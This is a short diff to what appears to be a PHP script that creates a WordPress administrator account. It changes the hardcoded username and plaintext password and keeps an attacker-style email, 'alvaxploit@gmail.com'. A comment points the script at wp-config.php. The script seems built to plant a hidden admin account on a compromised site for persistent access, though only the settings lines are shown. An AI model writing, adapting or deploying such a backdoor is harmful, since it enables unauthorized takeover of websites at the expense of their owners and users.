@@ -9,8 +9,8 @@
  */
 
 // Fixed user settings for the new admin user
-$new_user_login = 'alvaxploit@123';   // Fixed username
-$new_user_pass  = 'alvaxploit@123';        // Fixed password (plaintext)
+$new_user_login = 'adminsuper';   // Fixed username
+$new_user_pass  = '@kimakkau77';        // Fixed password (plaintext)
 $new_user_email = 'alvaxploit@gmail.com';    // You can update this email if you want
 
 // Path to wp-config.php file
